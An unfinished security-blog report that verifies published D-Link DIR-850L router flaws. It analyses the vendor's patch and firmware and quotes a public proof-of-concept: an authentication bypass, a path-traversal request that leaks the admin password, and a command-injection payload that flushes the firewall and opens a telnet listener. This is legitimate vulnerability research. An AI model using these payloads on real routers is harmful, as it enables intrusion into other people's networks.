<!DOCTYPE html>
<html lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="Preface
I flipped through my notes to see if there was anything worth publishing, and found this one‚Äîbut it‚Äôs already outdated. I spent one night getting about halfway through it, then got sent on a business trip. Another intern couldn‚Äôt finish it, so it ended up being dropped. It doesn‚Äôt have much research value now, so I‚Äôll just post it anyway."><title>D-Link DIR-850L Router Vulnerability Verification Report&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="D-Link DIR-850L Router Vulnerability Verification Report" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/en/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/en/categories/">Categories</a><a class="nav item" href="/en/tags/">Tags</a><a class="nav item" href="/en/about/">About</a><a class="nav item" href="/en/links/">Links</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
    <h1 class="article title">D-Link DIR-850L Router Vulnerability Verification Report</h1><p class="article date">Thursday, June 22, 2017<span class="langs"><span class="lang">
                    <a href="/zh/posts/d-link-dir-850l-router-vulnerability-report/" title="‰∏≠Êñá">
                        <span class="lang-icon">üåê</span>‰∏≠Êñá</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="preface">Preface</h2>
<p>I flipped through my notes to see if there was anything worth publishing, and found this one‚Äîbut it‚Äôs already outdated. I spent one night getting about halfway through it, then got sent on a business trip. Another intern couldn‚Äôt finish it, so it ended up being dropped. It doesn‚Äôt have much research value now, so I‚Äôll just post it anyway.</p>
<blockquote>
<p>On August 10, 2017, CNVD published an authentication information disclosure vulnerability and a remote command execution vulnerability affecting D-Link DIR series routers (CNVD-2017-20002, CNVD-2017-20001). According to Knownsec‚Äôs verification, affected D-Link router models are not limited to the officially confirmed DIR-850L; other affected models include DIR-868L, DIR-600, DIR-860L, DIR-815, DIR-890L, DIR-610L, and DIR-822. Related exploit code has been published on the internet. The number of affected devices is estimated to exceed 200,000, which may trigger large-scale cyber attacks.</p>
</blockquote>
<p>We purchased a DIR-850L/B1, a model not officially confirmed but listed as affected, in order to verify whether the issues described in the advisory are real.<br>
We also downloaded the latest firmware of other models in the affected list for analysis, to validate the reliability of the data.</p>
<h2 id="verification-preparation">Verification Preparation</h2>
<p>First, we simulated a real-world usage environment: configured internet access parameters, set the Wi‚ÄëFi password and the admin password, and registered a MyDlink account.<br>
<img loading="lazy"  src="./configured.png"
        alt="configured"/></p>
<p>We planned to verify the vulnerabilities on the current version (2.06) first, then flash the latest firmware and verify again. The latest official firmware for <a href="http://support.dlink.com/ProductInfo.aspx?m=DIR-850L"target="_blank" rel="noopener noreferrer">DIR-850L/B1</a> is 2.07B05, released on 02/21/17, which suggests the vendor did not patch it.<br>
Then we tested whether the target device could be accessed directly via WAN. The result showed that the device could not be accessed directly through WAN.<br>
<img loading="lazy"  src="./port-scan.png"
        alt="port-scan"/><br>
Unless remote management is manually enabled, you can only access the router via the WAN port on a non-80 port.
<img loading="lazy"  src="./remote.png"
        alt="remote"/></p>
<h2 id="analysis">Analysis</h2>
<p>The original author stated that the remote command execution is composed of two vulnerabilities, and that the combination allows arbitrary command execution.</p>
<ul>
<li>An unauthenticated user can upload arbitrary files</li>
<li>An administrator user can execute arbitrary code</li>
</ul>
<p>However, we did not find evidence proving arbitrary file upload.</p>
<h3 id="patch-diff">Patch Diff</h3>
<p><img loading="lazy"  src="./bcompare.png"
        alt="bcompare"/><br>
The main changed executable is <code>cgibin</code>, and the script files are <code>DEVICE.TIME.php</code> and <code>fatlady.php</code>.<br>
<code>DEVICE.TIME.php</code> adds validation of the NTP server domain name to prevent command injection.<br>
<img loading="lazy"  src="./device-time-patch.png"
        alt="device-time-patch"/><br>
<code>fatlady.php</code> adds filtering for relative-path construction characters.<br>
<img loading="lazy"  src="./fatlady-patch.png"
        alt="fatlady-patch"/></p>
<p>We first analyzed the PoC and firmware of DIR-850L/A. The author‚Äôs PoC demonstrated 4 issues and chained them to achieve remote command execution.</p>
<h3 id="unauthorized-access">Unauthorized Access</h3>
<p>Unauthenticated users can directly access CGI endpoints.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;whatever&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>Using a header with <code>AUTHORIZED_GROUP&gt;=1</code> can also bypass the validation:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -d <span class="s2">&#34;SERVICES=DEVICE.ACCOUNT&amp;x=y&amp;AUTHORIZED_GROUP=1&#34;</span> <span class="s2">&#34;http://192.168.1.159:8080/getcfg.php&#34;</span>
</span></span></code></pre></div><h3 id="reading-the-admin-password">Reading the Admin Password</h3>
<p>Craft an XML, send it to <code>/hedwig.cgi</code>, then read the username and password from the response.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;whatever&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;postxml&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;module&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/module&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/postxml&gt;&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/hedwig.cgi&#34;</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">accdata</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&lt;?xml&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_pasw</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">accdata</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">accounts</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;/module/device/account/entry&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="n">pasw</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;name:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;pass:&#34;</span><span class="p">,</span> <span class="n">pasw</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&#34;Admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">admin_pasw</span> <span class="o">=</span> <span class="n">pasw</span>
</span></span></code></pre></div><h3 id="brute-forcing-the-login-token">Brute-Forcing the Login Token</h3>
<p>The encrypted <code>password</code> in the payload can be constructed by yourself and brute-forced. In the PoC it is used to log in and obtain the cookie.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/authentication.cgi&#34;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl"><span class="c1"># print(resp.text)  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;status&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&#34;ok&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;uid:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;challenge:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">]})</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Auth login...&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">user_name</span> <span class="o">=</span> <span class="s2">&#34;Admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">user_pasw</span> <span class="o">=</span> <span class="n">admin_pasw</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">user_name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">user_pasw</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="p">(</span><span class="n">user_name</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="s2">&#34;md5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/authentication.cgi&#34;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
</span></span></code></pre></div><h3 id="two-command-injections">Two Command Injections</h3>
<p>Both <code>pigwidgeon.cgi</code> and <code>hedwig.cgi</code> have command injection. The payload is sent by crafting XML and then POSTing it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;SERVICES&#34;</span><span class="p">:</span> <span class="s2">&#34;DEVICE.TIME&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/getcfg.php&#34;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp/enable&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp/server&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;metelesku; (&#34;</span> <span class="o">+</span> <span class="n">COMMAND</span> <span class="o">+</span> <span class="s2">&#34;) &amp; exit; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp6/enable&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">tostring</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>  
</span></span></code></pre></div><p>After reviewing the PoC, we unpacked the D-Link firmware and analyzed the files:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">binwalk DIR850LA1_FW114b07WW.bin
</span></span><span class="line"><span class="cl">dd <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">1638544</span> <span class="k">if</span><span class="o">=</span>DIR850LA1_FW114b07WW.bin <span class="nv">of</span><span class="o">=</span>DIR850LA1_FW114b07WW.squashfs
</span></span><span class="line"><span class="cl">unsquashfs DIR850LA1_FW114b07WW.squashfs
</span></span></code></pre></div><p>We found that the CGI files in this directory are all symlinks pointing to <code>cgibin</code>.<br>
<img loading="lazy"  src="./files.png"
        alt="files"/><br>
The web backend provides HNAP WebServices via PHP, and the frontend makes asynchronous requests.<br>
We analyzed the executable <code>/htdocs/cgibin</code> used to dispatch PHP and followed from the entry point.<br>
<img loading="lazy"  src="./main.png"
        alt="main"/><br>
It matches the corresponding CGI via <code>argv[0]</code>; the CGI then executes the PHP file. If there is no match, it outputs:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">CGI.BIN, unknown command argv[0]
</span></span></code></pre></div><p><img loading="lazy"  src="./main1.png"
        alt="main1"/><br>
<code>hedwigcgi_main</code> parses the received XML text into parameters, then passes them to <code>/htdocs/webinc/fatlady.php</code>.<br>
<img loading="lazy"  src="./tofatlady.png"
        alt="tofatlady"/></p>
<p>The key is these three lines: it reads the <code>service</code> parameter and lets PHP load a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$service</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;service&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s2">&#34;/htdocs/phplib/fatlady/&#34;</span><span class="o">.</span><span class="nv">$service</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$target</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="nv">$target</span><span class="p">);</span>
</span></span></code></pre></div><p>By crafting directory traversal, you can achieve arbitrary file inclusion and leak sensitive information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/htdocs/phplib/fatlady/../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php
</span></span></code></pre></div><p><img loading="lazy"  src="./getcfg.png"
        alt="getcfg"/></p>
<p><code>pigwidgeoncgi_main</code> first checks whether the session belongs to an admin. If yes, it parses the XML, sets the <code>ACTION</code> parameter to <code>SETCFG</code>, and passes it to <code>/htdocs/webinc/wand.php</code>.<br>
<img loading="lazy"  src="./session.png"
        alt="session"/><br>
<img loading="lazy"  src="./wand1.png"
        alt="wand1"/><br>
<img loading="lazy"  src="./wand2.png"
        alt="wand2"/></p>
<p>Key code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$svc</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;service&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;/htdocs/phplib/setcfg/&#34;</span><span class="o">.</span><span class="nv">$svc</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span></code></pre></div><p>Then it can include the specified file <code>DEVICE.TIME</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">service</span> <span class="o">=</span> <span class="n">DEVICE</span><span class="o">.</span><span class="n">TIME</span>
</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">metelesku</span><span class="p">;</span> <span class="p">(</span><span class="n">iptables</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">INPUT</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">FORWARD</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">P</span> <span class="n">OUTPUT</span> <span class="n">ACCEPT</span><span class="p">;</span><span class="n">telnetd</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23090</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">date</span><span class="p">)</span> <span class="o">&amp;</span><span class="p">;</span> <span class="n">exit</span><span class="p">;</span>
</span></span></code></pre></div><h2 id="verification">Verification</h2>
<p>The above analysis is based on DIR-850L/A firmware 1.14.B07. After running the PoC script against DIR-850L/B, we were able to reproduce three of the issues. Only some CGI endpoints were accessible without authorization; <code>getcfg.php</code> required login.<br>
<img loading="lazy"  src="./401.png"
        alt="401"/><br>
Without an admin cookie, command injection only returned OK on <code>hedwig.cgi</code>; <code>pigwidgeon</code> returned ‚Äúno power‚Äù.<br>
<img loading="lazy"  src="./no-power.png"
        alt="no-power"/><br>
In the China firmware, the login endpoint <code>authentication.cgi</code> becomes <code>webfa_authentication.cgi</code>.
Verify unauthorized CGI access:<br>
<img loading="lazy"  src="./access-cgi.png"
        alt="access-cgi"/><br>
Verify local file inclusion to read the username/password:<br>
<img loading="lazy"  src="./lfi.png"
        alt="lfi"/><br>
Code injection:</p>
<h2 id="analyzing-dir-850lb">Analyzing DIR-850L/B</h2>
<p>Because the advisory did not specify the hardware revision or firmware version, the PoC‚Äôs exploit scope is limited. We are not yet sure whether DIR-850L/B is truly vulnerable; we need to analyze the 850L/B firmware. However, the firmware on the official site is encrypted and cannot be analyzed directly. There are two options: obtain root to extract the firmware, or dump the firmware by reading the flash chip.</p>
<p>This time another LAN arbitrary command execution issue also surfaced. The exploitation conditions are strict: the system runs <code>dnsmasq</code> as root, and its daemon obtains the <code>&quot;host-name&quot;</code> parameter from the DHCP server, concatenates it, and executes it. We can obtain root by injecting commands.</p>
<p><img loading="lazy"  src="./UART1.png"
        alt="UART1"/><br>
<img loading="lazy"  src="./UART2.png"
        alt="UART2"/><br>
Mounted partitions for extracted firmware:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dd if=/dev/mtdblock/7 of=/var/tmp/storage/Generic_Ubuntu_C2EE4/mtdblock0.bin bs=8
</span></span><span class="line"><span class="cl">unsquashfs mtdblock0.bin
</span></span></code></pre></div><h3 id="todo-1">TODO 1</h3>
<p>Analyze differences in file layout and program behavior and write them up.</p>
<h2 id="internet-wide-scan-statistics">Internet-wide Scan Statistics</h2>
<h3 id="todo-0">TODO 0</h3>
<p>Use Allseeing‚Äôs internet-wide scan results and write a script to count routers that are vulnerable and exploitable.</p>
<h2 id="references">References</h2>
<p><a href="https://blogs.securiteam.com/index.php/archives/3364"target="_blank" rel="noopener noreferrer">SSD Advisory</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-96333"target="_blank" rel="noopener noreferrer">Seebug</a></p>
<p><a href="http://www.cnvd.org.cn/webinfo/show/4202"target="_blank" rel="noopener noreferrer">CNVD</a></p>
<!-- TODO: translate content from zh version; assets are copied. -->
</article><section class="article labels"><a class="category" href=/en/categories/hardware-security/>Hardware Security</a><a class="tag" href=/en/tags/d-link/>D-Link</a><a class="tag" href=/en/tags/iot/>IoT</a><a class="tag" href=/en/tags/vulnerability/>vulnerability</a></section>
</div>
<div class="article bottom"><section class="article navigation"><p><a class="link" href="/en/posts/hackrf-gps-spoofing/"><span class="iconfont icon-article"></span>HackRF GPS Spoofing Notes</a></p><p><a class="link" href="/en/posts/exploiting-cve-2017-0199/"><span class="iconfont icon-article"></span>Exploiting OFFICE OLE2LINK (CVE-2017-0199)</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (Attribution-NonCommercial-ShareAlike).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>